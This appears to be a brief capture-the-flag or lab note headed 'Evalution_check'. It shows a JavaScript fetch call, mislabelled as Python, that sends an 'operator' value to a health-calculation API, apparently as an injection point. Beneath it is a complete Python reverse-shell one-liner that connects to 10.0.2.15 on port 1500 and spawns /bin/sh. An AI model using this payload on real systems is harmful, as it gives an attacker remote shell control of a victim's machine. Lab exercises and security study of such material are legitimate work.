Evalution_check
```python

const calculate_health = (power, operator) => {
   fetch('/api/get_health',{
      method:'POST',
      headers: {
         'Content-Type': 'application/json'
      },
      body: JSON.stringify({ 'current_health': health.toString(), 'attack_power': power, 'operator': operator })
   }) ...

```


python -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.15",1500));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'